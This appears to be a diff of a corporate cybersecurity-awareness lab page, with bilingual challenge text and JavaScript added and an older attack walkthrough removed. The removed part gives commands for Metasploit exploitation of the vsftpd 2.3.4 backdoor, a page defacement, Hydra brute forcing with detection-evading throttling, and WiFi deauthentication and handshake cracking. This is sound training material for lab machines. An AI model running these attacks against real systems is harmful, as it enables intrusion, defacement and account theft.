+        <button class="hint-button" onclick="completeChallenge(4, 25)">✅ WiFi Hacked!</button>
+      </div>
+    </div>
+
+    <!-- Completion -->
+    <div class="challenge-card" id="completion" style="display: none;">
+      <div class="challenge-title">
+        🏆 ING Factory Security Training Complete!
+      </div>
+      <div class="challenge-description">
+        <div class="ing-factory-badge">Congratulations - You've Built Security Knowledge!</div>
+        <br>
+        <strong>🎓 What you've learned:</strong>
+        <ul>
+          <li>🔍 Network reconnaissance and vulnerability discovery</li>
+          <li>💥 How security flaws are exploited by attackers</li>
+          <li>🔓 Why strong passwords are absolutely critical</li>
+          <li>📡 WiFi security vulnerabilities and wireless attacks</li>
+          <li>🛡️ How to think like both attacker and defender</li>
+        </ul>
+        <br>
+        <strong>🏭 Apply this in your daily work:</strong>
+        <ul>
+          <li>✅ Use unique, strong passwords with a password manager</li>
+          <li>✅ Keep software updated to patch vulnerabilities</li>
+          <li>✅ Use WPA3 WiFi encryption with complex passwords</li>
+          <li>✅ Avoid public WiFi for sensitive activities</li>
+          <li>✅ Be suspicious of unexpected emails and links</li>
+          <li>✅ Report security concerns to your IT team</li>
+        </ul>
+      </div>
+    </div>
   </div>
 
-  <div class="status-section">
-    <h2>Nmap Scan Results</h2>
-    <p>Nmap, 'the Network Mapper', is a network scanner. It allows you to see what hosts are on a network and what ports
-      are opened. <br />
-      We've performed a scan using <code>nmap -sV -p -100 --script vulners $kali_ip</code>, where
-      <code>-sV is to probe open ports to determine service/version info</code> and
-      <code>-p -100</code> specifies the port to scan, in this case equal or below 100
-      <code>--script vulners</code> tries to automatically find CVEs for open ports...
-    </p>
-    <pre class="pre-wrap">$nmap_result</pre>
-  </div>
-  <p>For more information about vsftpd 2.3.4, please visit:<a href="https://nvd.nist.gov/vuln/detail/CVE-2011-2523"
-      target="_blank">vsftpd 2.3.4</a>
-    <hr>
-
-  <h1 class="center">Exploiting CVE-2011-2523 with Metasploit</h1>
-
-  <p>This demonstrates how to exploit CVE-2011-2523, a backdoor vulnerability in VSFTPd 2.3.4, using Metasploit.
-    The attacking machine is named "kali $kali_ip ," and the vulnerable machine is named "badweb $badweb_ip."</p>
-
-  <h2>Understanding CVE-2011-2523</h2>
-
-  <p>CVE-2011-2523 is a backdoor vulnerability that was intentionally introduced into VSFTPd 2.3.4. When a username
-    ending with "<code>:)&rpar;</code>" is used, the backdoor opens a listening shell on port 6200 of the vulnerable
-    server. This allows
-    remote attackers to execute arbitrary commands.</p>
-
-  <h2>Step-by-Step Guide</h2>
-
-  <ol>
-    <li>
-      <strong>Connect to the Kali machine running within Docker:</strong>
-      <p>Open a terminal and run the following command: <code>docker exec -it kali bash</code></p>
-      <p>You should be greeted by a <code>root㉿attackmachine</code> shell.</p>
-      <small>The <code>-it</code> instructs Docker to allocate a pseudo-TTY connected to the container's stdin;
-        creating an interactive bash shell in the container.</small>
-    </li>
-
-    <li>
-      <strong>See what website is being hosted:</strong>
-      <p>In the terminal, use <code>curl</code> to view its contents:</p>
-      <p><code>curl victimmachine</code></p>
-      <p>You should see some HTML being returned.</p>
-    </li>
-
-    <li>
-      <strong>Start Metasploit on the attack machine:</strong>
-      <p>Use the terminal to start the Metasploit Framework:</p>
-      <p><code>msfconsole</code></p>
-    </li>
-
-    <li>
-      <strong>Search for the exploit:</strong>
-      <p>In the Metasploit console, search for the VSFTPd backdoor exploit:</p>
-      <p><code>search vsftpd</code></p>
-    </li>
-
-    <li>
-      <strong>Use the exploit module:</strong>
-      <p>Select the exploit module:</p>
-      <p><code>use exploit/unix/ftp/vsftpd_234_backdoor</code></p>
-      <small>TIP: Often shells provide autocompletion with the Tab key.</small>
-    </li>
-
-    <li>
-      <strong>Set the remote host (RHOSTS):</strong>
-      <p>Set the IP address or hostname of the "badweb" machine:</p>
-      <p><code>set RHOSTS $badweb_ip</code></p>
-    </li>
-
-    <li>
-      <strong>Run the exploit:</strong>
-      <p>Execute the exploit:</p>
-      <p><code>exploit</code></p>
-      <small>TIP: If you don't get a root shell, try running the exploit again.</small><br>
-      <small>TIP: Press Ctrl+C to escape your current program, e.g., shell or exploit.</small>
-    </li>
-
-    <li>
-      <strong>Interact with the Shell:</strong>
-      <p>If you have shell access to the <code>badweb</code> machine, try running:</p>
-      <p><code>whoami</code></p>
-      <p>or</p>
-      <p><code>ls -l</code></p>
-      <small>TIP: To confirm you're on the correct machine, run <code>cat /etc/hostname</code>. It should return
-        <code>victimmachine</code>.</small>
-    </li>
-
-    <li>
-      <strong>Change the Webpage:</strong>
-      <p>The webpage for <code>$badweb_ip</code> is <code>index.html</code> located in
-        <code>/home/admin</code>. Let’s read and modify it:
-      </p>
-
-      <p>Navigate to the directory:</p>
-      <p><code>cd /home/admin</code></p>
-
-      <p>List the files:</p>
-      <p><code>ls</code></p>
-
-      <p>Read the contents of <code>index.html</code>:</p>
-      <p><code>cat index.html</code></p>
-
-      <p><strong>Replace the current webpage:</strong> <a href="http://$badweb_ip" target="_blank">$badweb_ip</a> with
-        the word
-        <code>byebye</code>:
-      </p>
-      <p><code>echo byebye > index.html</code></p>
-
-      <p>Check the updated file:</p>
-      <p><code>cat index.html</code></p>
-
-      <p><strong>Look at the <a href="https://en.wikipedia.org/wiki/Website_defacement">defaced</a> webpage:</strong>
-        <a href="http://$badweb_ip" target="_blank">$badweb_ip</a>
-    </li>
-
-    <li>
-      <strong>Explanation of the exploit:</strong>
-      <p>The exploit sends a specially crafted ftp login request. The username ends in ":)". This causes the
-        vulnerable vsftpd server to open a listening shell on port 6200. Metasploit then connects to this port, and
-        provides an interactive shell.</p>
-    </li>
-  </ol>
-
-  <h2>Important Notes</h2>
-
-  <ul>
-    <li>This exploit only works on VSFTPd version 2.3.4.</li>
-    <li>This demonstration is for educational purposes only. Do not use these techniques against systems without
-      explicit permission.</li>
-  </ul>
-
-  <!-- ################################################################################ -->
-  <hr />
-
-  <h1 class="center">Brute Force Password Attacks with Crunch and Hydra</h1>
-
-  <p>This demonstrates how to perform brute-force attacks using Crunch for wordlist generation and Hydra for brute-force
-    password attacks. The
-    attacking machine is Kali Linux and the target is a vulnerable FTP server.</p>
-
-  <h2>Understanding Password Cracking Tools</h2>
-
-  <p><strong>Crunch</strong> is a wordlist generator that creates customized dictionaries based on specific patterns and
-    character sets. It's useful for targeted brute force attacks when you have some information about the password
-    structure.</p>
-
-  <p><strong>Hydra</strong> is a fast and flexible online password cracking tool that supports numerous protocols. It's
-    designed to perform rapid dictionary attacks against various network services.</p>
-
-  <h2>Step-by-Step Guide</h2>
-
-  <ol>
-    <li>
-      <strong>Connect to the Kali machine:</strong>
-      <p>Open a terminal</p>
-      <p>Run this command:</p>
-      <code>docker exec -it kali bash</code>
-    </li>
-    <li>
-      <strong>Generate a wordlist using Crunch:</strong>
-      <p>Crunch can generate all possible combinations of a character set with defined length parameters.</p>
-      <code>crunch 5 5 abcdefghijklmnopqrstuvwxyz -o 5letter.txt</code>
-      <p>This command creates a wordlist containing:</p>
-      <ul>
-        <li>All 5-character passwords (min length <code>5</code> and max length <code>5</code>)</li>
-        <li>Using only lowercase letters (<code>abcdefghijklmnopqrstuvwxyz</code>)</li>
-        <li>Saving the output to a file named <code>5letter.txt</code></li>
-      </ul>
-    </li>
-    <li>
-      <strong>Examine the wordlist:</strong>
-      <p>Check the wordlist file and its size:</p>
-      <pre><code>ls -lh 5letter.txt
-head -n 10 5letter.txt
-wc -l 5letter.txt</code></pre>
-      <small><code>ls</code> shows permissions, links, owner, group, size, date, filename</small><br />
-      <small><code>head</code> prints the first 10 entries</small><br />
-      <small><code>wc</code> is the word count utility, <code>-l</code> is the amount of lines</small>
-    </li>
-    <li>
-      <strong>Perform a brute force attack with Hydra:</strong>
-      <p>Use Hydra to attempt login to the FTP server with the generated wordlist:</p>
-      <code>hydra -l admin -P 5letter.txt ftp://${badweb_ip}</code>
-      <p>Where:</p>
-      <ul>
-        <li><code>-l admin</code> specifies the username to try (we know it's "admin")</li>
-        <li><code>-P 5letter.txt</code> specifies the wordlist file to use</li>
-        <li><code>ftp://${badweb_ip}</code> is the target FTP service</li>
-      </ul>
-    </li>
-    <li>
-      <strong>Wait for results:</strong>
-      <p>Hydra will attempt each password in the wordlist until it finds a match or exhausts all possibilities. This may
-        take some time depending on the size of the wordlist.</p>
-    </li>
-    <li>
-      <strong>Successful login:</strong>
-      <p>When Hydra finds the correct password, it will display output similar to:</p>
-      <pre><code>[21][ftp] host: ${badweb_ip}   login: admin   password: password123</code></pre>
-    </li>
-    <li>
-      <strong>Connect to the FTP server:</strong>
-      <p>Verify the credentials by connecting to the FTP server:</p>
-      <pre><code>ftp ${badweb_ip}</code></pre>
-      <p>When prompted, enter:</p>
-      <ul>
-        <li>Username: <code>admin</code></li>
-        <li>Password: <code>password123</code> (or whatever password Hydra discovered)</li>
-      </ul>
-    </li>
-    <li>
-      <strong>Navigate the FTP server:</strong>
-      <p>Once connected, you can list directories and download files:</p>
-      <pre><code>ls
-get index.html
-exit</code></pre>
-    </li>
-  </ol>
-
-  <h2>Permutations vs Iteration</h2>
-  <p>
-    Crunch is excellent for generating every possible combination of a character set, but this exhaustive approach often
-    consumes time we don't have. To save resources, creating smart permutations based on likely patterns is more
-    versatile and efficient.
-  </p>
-
-  <ul>
-    <li>
-      <strong>Generate a smart wordlist using rsmangler:</strong>
-      <p>
-        rsmangler creates permutations by intelligently modifying words from an existing wordlist. For example, to
-        prepend or append specific values to a base wordlist:
-      </p>
-      <code>rsmangler --file wordlist.txt --prefixes foo,bar,foobar --suffixes xor --output mangled_wordlist.txt</code>
-      <p>This command achieves:</p>
-      <ul>
-        <li>Prepending <code>foo</code>, <code>bar</code>, and <code>foobar</code> to each word</li>
-        <li>Appending <code>xor</code> to each word</li>
-        <li>Saving the result to a file named <code>mangled_wordlist.txt</code></li>
-      </ul>
-    </li>
-    <li>
-      <strong>Examine the mangled wordlist:</strong>
-      <p>Verify the contents and size of the generated wordlist:</p>
-      <pre><code>ls -lh mangled_wordlist.txt
-head -n 10 mangled_wordlist.txt
-wc -l mangled_wordlist.txt</code></pre>
-    </li>
-  </ul>
-
-  <h2>Advanced Crunch Usage</h2>
-
-  <div class="status-section">
-    <h3>Custom Character Sets</h3>
-    <pre><code>crunch 8 8 ABC123!@# -o custom.txt</code></pre>
-    <p>This generates 8-character passwords using only uppercase letters, numbers 1-3, and specific symbols.</p>
-  </div>
-
-  <div class="status-section">
-    <h3>Pattern-Based Generation</h3>
-    <pre><code>crunch 8 8 -t pass%%%% -o pattern.txt</code></pre>
-    <p>This creates passwords that start with "pass" followed by 4 digits.</p>
-  </div>
-
-  <div class="status-section">
-    <h3>Limiting Output Size</h3>
-    <pre><code>crunch 6 6 0123456789 -s 900000 -e 950000 -o chunk.txt</code></pre>
-    <p>This generates 6-digit passwords starting from 900000 and ending at 950000.</p>
-  </div>
-
-  <h2>Advanced Hydra Usage</h2>
-
-  <div class="status-section">
-    <h3>Multiple Usernames</h3>
-    <pre><code>hydra -L users.txt -P passwords.txt ftp://${badweb_ip}</code></pre>
-    <p>Tests all combinations of usernames from users.txt and passwords from passwords.txt.</p>
-  </div>
-
-  <div class="status-section">
-    <h3>Throttling Requests</h3>
-    <pre><code>hydra -l admin -P wordlist.txt -t 4 ftp://${badweb_ip}</code></pre>
-    <p>Limits to 4 parallel connections to avoid detection.</p>
-  </div>
-
-  <div class="status-section">
-    <h3>Verbose Output</h3>
-    <pre><code>hydra -l admin -P wordlist.txt -V ftp://${badweb_ip}</code></pre>
-    <p>Shows each attempt in real-time.</p>
-  </div>
-
-  <h2>Advanced rsmangler usage</h2>
-
-  <div class="status-section">
-    <h3>Use External Files for Custom Prefixes and Suffixes</h3>
-    <pre><code>rsmangler --file wordlist.txt --prefix-file extras.txt --suffix-file extras.txt --output mangled_wordlist.txt</code></pre>
-    <p>This command allows using <code>extras.txt</code> as the source for both prefixes and suffixes, enabling greater
-      flexibility and reuse of predefined values.</p>
-  </div>
-
-  <h2>Important Notes</h2>
-
-  <ul>
-    <li>Password attacks should only be performed against systems you own or have explicit permission to test.</li>
-    <li>Brute force attacks are resource-intensive and may be detected by intrusion detection systems.</li>
-    <li>Many systems implement account lockout policies after multiple failed attempts.</li>
-    <li>These techniques are demonstrated for educational purposes to understand security vulnerabilities.</li>
-  </ul>
-
-  <!-- ################################################################################ -->
-  <hr />
-
-  <h1 class="center">WiFi Hacking: Wireless Network Vulnerabilities</h1>
-
-  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 600 300">
-    <rect width="600" height="300" fill="#fff" />
-    <g transform="translate(50, 80)" filter="url(#shadow)">
-      <rect width="150" height="90" rx="8" ry="8" fill="url(#computerGradient)" stroke="#333" stroke-width="1" />
-
-      <text x="75" y="20" text-anchor="middle" font-weight="bold" font-size="12">
-        Raspberry Pi
-      </text>
-
-      <text x="75" y="40" text-anchor="middle" font-size="10">
-        Wifi: wlan0
-      </text>
-
-      <text x="75" y="55" text-anchor="middle" font-size="10">
-        Tools: airmon-ng, hashcat
-      </text>
-
-      <rect x="5" y="75" width="140" height="7" fill="#4CAF50" rx="3" ry="3" />
-    </g>
-
-    <g transform="translate(350, 80)" filter="url(#shadow)">
-      <rect width="150" height="90" rx="8" ry="8" fill="url(#computerGradient)" stroke="#333" stroke-width="1" />
-
-      <text x="75" y="20" text-anchor="middle" font-weight="bold" font-size="12">
-        Wifi Access Point
-      </text>
-
-      <text x="75" y="40" text-anchor="middle" font-size="10">
-        Wifi: hackme
-      </text>
-
-      <text x="75" y="55" text-anchor="middle" font-size="10">
-
-      </text>
-
-      <rect x="5" y="75" width="140" height="7" fill="#FF5722" rx="3" ry="3" />
-    </g>
-
-    <path d="M200,125 Q300,95 350,125" fill="none" stroke="#2196F3" stroke-width="2" stroke-dasharray="3,3" />
-
-    <text x="275" y="90" text-anchor="middle" font-size="10" fill="#2196F3">
-    </text>
-  </svg>
-
-  <p>Here we demonstrate the risks of weak WiFi passwords and the techniques used to compromise wireless networks.
-    We attack from the Raspberry Pi itself, and the target is a vulnerable WiFi network with a weak password.</p>
-
-  <h2>Understanding WiFi Security Vulnerabilities</h2>
-
-  <p>WPA-2 Wireless networks are particularly vulnerable to attacks due to their broadcast nature. Weak passwords can be
-    cracked using various techniques, including:</p>
-  <ul>
-    <li><strong>Brute Force Attacks:</strong> Systematically trying all possible password combinations</li>
-    <li><strong>Dictionary Attacks:</strong> Using pre-compiled lists of common passwords</li>
-    <li><strong>Handshake Capture:</strong> Intercepting the authentication process to crack passwords offline</li>
-  </ul>
-
-  <h2>Lab Setup and Tools</h2>
-
-  <div class="status-section">
-    <h3>Required Tools</h3>
-    <ul>
-      <li><strong>Aircrack-ng Suite:</strong> Comprehensive WiFi cracking toolkit</li>
-      <li><strong>Wireshark:</strong> Network protocol analyzer</li>
-      <li><strong>Hashcat:</strong> Advanced password recovery tool</li>
-    </ul>
-  </div>
-
-  <h2>Step-by-Step WiFi Hacking Demonstration</h2>
-
-  <ol>
-
-    <li>
-      <strong>WiFi Network Reconnaissance:</strong>
-      <p>Scan for available WiFi networks:</p>
-      <pre class="pre-wrap"><code>airmon-ng</code></pre>
-      <small>TIP: check out <code>sudo</code> for running programs as root</small>
-      <p>Put wireless interface into monitor mode:</p>
-      <pre class="pre-wrap"><code>airmon-ng start wlan1</code></pre>
-      <p>Scan for networks:</p>
-      <pre class="pre-wrap"><code>airodump-ng wlan1</code></pre>
-      <small>When your WiFi target is acquired, press Ctrl+c to quit.</small>
-    </li>
-
-    <li>
-      <strong>Capture WiFi Handshake:</strong>
-      <p>Target a specific network and capture the authentication handshake:</p>
-      <pre class="pre-wrap"><code>airodump-ng -c [CHANNEL] --bssid [MAC_ADDRESS] -w capture wlan0</code></pre>
-      <p>Deauthenticate a connected client to force re-authentication:</p>
-      <pre class="pre-wrap"><code>aireplay-ng -0 1 -a [ROUTER_MAC] -c [CLIENT_MAC] wlan0</code></pre>
-    </li>
-
-    <li>
-      <strong>Crack the Password:</strong>
-      <p>Use aircrack-ng with a wordlist:</p>
-      <pre class="pre-wrap"><code>aircrack-ng -w top-passwords-2024.txt capture-01.cap</code></pre>
-      <p>Or use hashcat for more advanced cracking:</p>
-      <pre class="pre-wrap"><code>hashcat -m 2500 capture-01.handshake top-passwords-2024.txt</code></pre>
-    </li>
-  </ol>
-
+  <script>
+    let totalScore = 0;
+    let completedChallenges = 0;
+    let currentLanguage = 'en';
+
+    // Language translations
+    const translations = {
+      en: {
+        header: {
+          badge: "ING Factory • ideas worth building",
+          title: "🔐 Cybersecurity Awareness Lab",
+          subtitle: "Building Security Knowledge Through Safe, Hands-On Learning"
+        },
+        score: {
+          progress: "Progress:",
+          steps: "Steps:"
+        },
+        welcome: "🎯 <strong>Welcome!</strong> This lab teaches cybersecurity awareness through controlled, educational exercises. No prior technical experience needed - we'll guide you step by step!",
+        challenge0: {
+          title: "🚀 Step 0: Connecting to Your Lab Environment",
+          difficulty: "START HERE",
+          description: "<strong>What you're doing:</strong> Before we can start learning about security, we need to connect to our practice environment. Think of this like logging into a computer that's specially set up for safe learning.",
+          setupTitle: "🖥️ Your Lab Setup",
+          kali: "Kali Linux",
+          target: "Vulnerable Target",
+          attack: "Your Attack Machine",
+          practice: "Practice Machine",
+          hints: {
+            docker: "🔧 What is Docker?",
+            connect: "📚 How to Connect", 
+            command: "💻 Connection Command",
+            solution: "🚨 Complete Solution"
+          },
+          complete: "✅ I'm Connected!"
+        },
+        challenge1: {
+          title: "🔍 Step 1: Discovering What's on the Network",
+          difficulty: "BEGINNER",
+          description: "<strong>What you're learning:</strong> How attackers discover what computers and services are available on a network.<br><br><strong>Your mission:</strong> Find out what services are running on the target machine and identify any security vulnerabilities.",
+          hints: {
+            scanning: "🤔 What is Network Scanning?",
+            tool: "🛠️ The Right Tool",
+            command: "📋 Understanding the Command",
+            solution: "🚨 Complete Solution"
+          },
+          complete: "✅ I Found the Vulnerability!"
+        },
+        challenge2: {
+          title: "💥 Step 2: Exploiting the Vulnerability", 
+          difficulty: "INTERMEDIATE",
+          description: "<strong>What you're learning:</strong> How to exploit the backdoor vulnerability you found.<br><br><strong>Your mission:</strong> Use Metasploit to exploit CVE-2011-2523 and gain control of the target.",
+          hints: {
+            backdoor: "🎭 What is a Backdoor?",
+            metasploit: "🛠️ Meet Metasploit",
+            exploit: "🔍 Finding the Exploit",
+            solution: "🚨 Complete Solution"
+          },
+          complete: "✅ I Owned the System!"
+        },
+        challenge3: {
+          title: "🔓 Step 3: Password Cracking",
+          difficulty: "ADVANCED", 
+          description: "<strong>What you're learning:</strong> How weak passwords can be cracked using automated tools.<br><br><strong>Your mission:</strong> Crack the FTP password for the 'admin' user using brute force techniques.",
+          hints: {
+            attacks: "🤔 How Password Attacks Work",
+            tools: "🛠️ Password Cracking Tools", 
+            approach: "💻 Smart Approach",
+            solution: "🚨 Complete Solution"
+          },
+          complete: "✅ Password Cracked!"
+        },
+        challenge4: {
+          title: "📡 Step 4: WiFi Network Security",
+          difficulty: "ADVANCED",
+          description: "<strong>What you're learning:</strong> How wireless networks can be compromised and why WiFi security matters. This demonstrates the risks of weak WiFi passwords and unsecured networks.<br><br><strong>Your mission:</strong> Discover wireless networks, capture authentication data, and crack a WiFi password.<br><br><strong>Real-world impact:</strong> WiFi attacks are common in public spaces and can lead to data theft and network infiltration.",
+          setupTitle: "📡 WiFi Lab Setup",
+          pi: "Raspberry Pi",
+          ap: "WiFi Access Point",
+          attack: "WiFi Attack Machine",
+          target: "Target Network: \"hackme\"",
+          setup: "This exercise simulates attacking a vulnerable WiFi network with a weak password.",
+          hints: {
+            hacking: "🤔 How WiFi Hacking Works",
+            tools: "🛠️ WiFi Security Tools",
+            monitor: "📡 Monitor Mode & Scanning", 
+            handshake: "🔑 Handshake Capture",
+            solution: "🚨 Complete Solution"
+          },
+          complete: "✅ WiFi Hacked!"
+        },
+        completion: {
+          title: "🏆 ING Factory Security Training Complete!",
+          badge: "Congratulations - You've Built Security Knowledge!",
+          learned: "🎓 What you've learned:",
+          points: [
+            "🔍 Network reconnaissance and vulnerability discovery",
+            "💥 How security flaws are exploited by attackers", 
+            "🔓 Why strong passwords are absolutely critical",
+            "📡 WiFi security vulnerabilities and wireless attacks",
+            "🛡️ How to think like both attacker and defender"
+          ],
+          apply: "🏭 Apply this in your daily work:",
+          tips: [
+            "✅ Use unique, strong passwords with a password manager",
+            "✅ Keep software updated to patch vulnerabilities",
+            "✅ Use WPA3 WiFi encryption with complex passwords",
+            "✅ Avoid public WiFi for sensitive activities", 
+            "✅ Be suspicious of unexpected emails and links",
+            "✅ Report security concerns to your IT team"
+          ]
+        }
+      },
+      nl: {
+        header: {
+          badge: "ING Factory • ideeën waard om te bouwen", 
+          title: "🔐 Cybersecurity Bewustzijn Lab",
+          subtitle: "Veiligheidskennis Opbouwen Door Veilig, Hands-On Leren"
+        },
+        score: {
+          progress: "Voortgang:",
+          steps: "Stappen:"
+        },
+        welcome: "🎯 <strong>Welkom!</strong> Dit lab leert cybersecurity bewustzijn door gecontroleerde, educatieve oefeningen. Geen technische ervaring nodig - wij begeleiden je stap voor stap!",
+        challenge0: {
+          title: "🚀 Stap 0: Verbinding Maken met je Lab Omgeving",
+          difficulty: "BEGIN HIER",
+          description: "<strong>Wat je doet:</strong> Voordat we kunnen beginnen met leren over beveiliging, moeten we verbinden met onze oefen omgeving. Zie dit als inloggen op een computer die speciaal is opgezet voor veilig leren.",
+          setupTitle: "🖥️ Jouw Lab Setup",
+          kali: "Kali Linux",
+          target: "Kwetsbaar Doelwit",
+          attack: "Jouw Aanval Machine",
+          practice: "Oefen Machine",
+          hints: {
+            docker: "🔧 Wat is Docker?",
+            connect: "📚 Hoe te Verbinden",
+            command: "💻 Verbindings Commando", 
+            solution: "🚨 Volledige Oplossing"
+          },
+          complete: "✅ Ik ben Verbonden!"
+        },
+        challenge1: {
+          title: "🔍 Stap 1: Ontdekken Wat er op het Netwerk is",
+          difficulty: "BEGINNER",
+          description: "<strong>Wat je leert:</strong> Hoe aanvallers ontdekken welke computers en diensten beschikbaar zijn op een netwerk.<br><br><strong>Jouw missie:</strong> Ontdek welke diensten draaien op de doelmachine en identificeer beveiligingskwetsbaarheden.",
+          hints: {
+            scanning: "🤔 Wat is Netwerk Scannen?",
+            tool: "🛠️ De Juiste Tool",
+            command: "📋 Het Commando Begrijpen",
+            solution: "🚨 Volledige Oplossing"
+          },
+          complete: "✅ Ik Vond de Kwetsbaarheid!"
+        },
+        challenge2: {
+          title: "💥 Stap 2: De Kwetsbaarheid Uitbuiten",
+          difficulty: "GEMIDDELD", 
+          description: "<strong>Wat je leert:</strong> Hoe je de backdoor kwetsbaarheid die je vond kunt uitbuiten.<br><br><strong>Jouw missie:</strong> Gebruik Metasploit om CVE-2011-2523 uit te buiten en controle over het doelwit te krijgen.",
+          hints: {
+            backdoor: "🎭 Wat is een Backdoor?",
+            metasploit: "🛠️ Kennismaken met Metasploit",
+            exploit: "🔍 De Exploit Vinden",
+            solution: "🚨 Volledige Oplossing"
+          },
+          complete: "✅ Ik Heb het Systeem Overgenomen!"
+        },
+        challenge3: {
+          title: "🔓 Stap 3: Wachtwoord Kraken",
+          difficulty: "GEVORDERD",
+          description: "<strong>Wat je leert:</strong> Hoe zwakke wachtwoorden gekraakt kunnen worden met geautomatiseerde tools.<br><br><strong>Jouw missie:</strong> Kraak het FTP wachtwoord voor de 'admin' gebruiker met brute force technieken.",
+          hints: {
+            attacks: "🤔 Hoe Wachtwoord Aanvallen Werken",
+            tools: "🛠️ Wachtwoord Kraak Tools",
+            approach: "💻 Slimme Aanpak", 
+            solution: "🚨 Volledige Oplossing"
+          },
+          complete: "✅ Wachtwoord Gekraakt!"
+        },
+        challenge4: {
+          title: "📡 Stap 4: WiFi Netwerk Beveiliging",
+          difficulty: "GEVORDERD",
+          description: "<strong>Wat je leert:</strong> Hoe draadloze netwerken gecompromitteerd kunnen worden en waarom WiFi beveiliging belangrijk is. Dit toont de risico's van zwakke WiFi wachtwoorden en onbeveiligde netwerken.<br><br><strong>Jouw missie:</strong> Ontdek draadloze netwerken, leg authenticatie gegevens vast en kraak een WiFi wachtwoord.<br><br><strong>Echte impact:</strong> WiFi aanvallen komen vaak voor in openbare ruimtes en kunnen leiden tot gegevensdiefstal en netwerk infiltratie.",
+          setupTitle: "📡 WiFi Lab Setup",
+          pi: "Raspberry Pi",
+          ap: "WiFi Access Point", 
+          attack: "WiFi Aanval Machine",
+          target: "Doelnetwerk: \"hackme\"",
+          setup: "Deze oefening simuleert een aanval op een kwetsbaar WiFi netwerk met een zwak wachtwoord.",
+          hints: {
+            hacking: "🤔 Hoe WiFi Hacken Werkt",
+            tools: "🛠️ WiFi Beveiligings Tools",
+            monitor: "📡 Monitor Modus & Scannen",
+            handshake: "🔑 Handshake Vastleggen", 
+            solution: "🚨 Volledige Oplossing"
+          },
+          complete: "✅ WiFi Gehackt!"
+        },
+        completion: {
+          title: "🏆 ING Factory Security Training Voltooid!",
+          badge: "Gefeliciteerd - Je Hebt Beveiligingskennis Opgebouwd!",
+          learned: "🎓 Wat je hebt geleerd:",
+          points: [
+            "🔍 Netwerk verkenning en kwetsbaarheid ontdekking",
+            "💥 Hoe beveiligingsfouten worden uitgebuit door aanvallers",
+            "🔓 Waarom sterke wachtwoorden absoluut cruciaal zijn", 
+            "📡 WiFi beveiligingskwetsbaarheden en draadloze aanvallen",
+            "🛡️ Hoe te denken als zowel aanvaller als verdediger"
+          ],
+          apply: "🏭 Pas dit toe in je dagelijkse werk:",
+          tips: [
+            "✅ Gebruik unieke, sterke wachtwoorden met een wachtwoordmanager",
+            "✅ Houd software bijgewerkt om kwetsbaarheden te patchen",
+            "✅ Gebruik WPA3 WiFi encryptie met complexe wachtwoorden",
+            "✅ Vermijd openbare WiFi voor gevoelige activiteiten",
+            "✅ Wees argwanend tegen onverwachte emails en links", 
+            "✅ Meld beveiligingsproblemen aan je IT team"
+          ]
+        }
+      }
+    };
+
+    function setLanguage(lang) {
+      currentLanguage = lang;
+      
+      // Update button states
+      document.getElementById('btn-en').classList.toggle('active', lang === 'en');
+      document.getElementById('btn-nl').classList.toggle('active', lang === 'nl');
+      
+      updateContent();
+    }
+
+    function updateContent() {
+      const t = translations[currentLanguage];
+      
+      // Update header
+      document.querySelector('.ing-factory-badge').textContent = t.header.badge;
+      document.querySelector('.header h1').textContent = t.header.title;
+      document.querySelector('.subtitle').textContent = t.header.subtitle;
+      
+      // Update score
+      document.querySelector('.score div:first-child').innerHTML = `${t.score.progress} <span id="score">${totalScore}</span>/125`;
+      document.querySelector('.score div:last-child').innerHTML = `${t.score.steps} <span id="completed">${completedChallenges}</span>/5`;
+      
+      // Update welcome message
+      document.querySelector('.important-note').innerHTML = t.welcome;
+      
+      // Update Challenge 0
+      updateChallenge('challenge0', t.challenge0);
+      updateChallenge('challenge1', t.challenge1);
+      updateChallenge('challenge2', t.challenge2);
+      updateChallenge('challenge3', t.challenge3);
+      updateChallenge('challenge4', t.challenge4);
+      
+      // Update completion
+      const completion = document.getElementById('completion');
+      if (completion.style.display !== 'none') {
+        updateCompletion(t.completion);
+      }
+    }
+
+    function updateChallenge(id, content) {
+      const challenge = document.getElementById(id);
+      const title = challenge.querySelector('.challenge-title');
+      const description = challenge.querySelector('.challenge-description');
+      const buttons = challenge.querySelectorAll('.hint-button');
+      
+      // Update title and difficulty
+      const titleText = title.childNodes[0];
+      const difficultySpan = title.querySelector('.difficulty');
+      titleText.textContent = content.title.split(' ').slice(0, -1).join(' ') + ' ';
+      difficultySpan.textContent = content.difficulty;
+      
+      // Update description
+      description.innerHTML = content.description;
+      
+      // Update setup sections if they exist
+      const setupTitle = challenge.querySelector('.lab-setup h3, .docker-diagram + p');
+      if (setupTitle && content.setupTitle) {
+        setupTitle.textContent = content.setupTitle;
+      }
+      
+      // Update hint buttons
+      const hintKeys = Object.keys(content.hints);
+      buttons.forEach((button, index) => {
+        if (hintKeys[index]) {
+          button.textContent = content.hints[hintKeys[index]];
+        }
+      });
+      
+      // Update complete button
+      const completeButton = challenge.querySelector('.hint-button:last-child');
+      if (completeButton && content.complete) {
+        completeButton.textContent = content.complete;
+      }
+    }
+
+    function updateCompletion(content) {
+      const completion = document.getElementById('completion');
+      completion.querySelector('.challenge-title').textContent = content.title;
+      completion.querySelector('.ing-factory-badge').textContent = content.badge;
+      
+      const learned = completion.querySelector('strong:first-of-type');
+      learned.textContent = content.learned;
+      
+      const points = completion.querySelectorAll('ul:first-of-type li');
+      content.points.forEach((point, index) => {
+        if (points[index]) points[index].textContent = point;
+      });
+      
+      const apply = completion.querySelector('strong:last-of-type');
+      apply.textContent = content.apply;
+      
+      const tips = completion.querySelectorAll('ul:last-of-type li');
+      content.tips.forEach((tip, index) => {
+        if (tips[index]) tips[index].textContent = tip;
+      });
+    }
+
+    function toggleHint(hintId) {
+      const hint = document.getElementById(hintId);
+      if (hint) {
+        if (hint.style.display === 'none' || hint.style.display === '') {
+          hint.style.display = 'block';
+          hint.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+        } else {
+          hint.style.display = 'none';
+        }
+      } else {
+        console.error('Hint element not found:', hintId);
+      }
+    }
+
+    function toggleAnswer(answerId) {
+      const answer = document.getElementById(answerId);
+      if (answer) {
+        if (answer.style.display === 'none' || answer.style.display === '') {
+          answer.style.display = 'block';
+          answer.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+        } else {
+          answer.style.display = 'none';
+        }
+      } else {
+        console.error('Answer element not found:', answerId);
+      }
+    }
+
+    function completeChallenge(challengeNumber, points) {
+      const challenge = document.getElementById(`challenge${challengeNumber}`);
+      if (challenge && !challenge.classList.contains('completed')) {
+        challenge.classList.add('completed');
+        
+        totalScore += points;
+        completedChallenges++;
+        
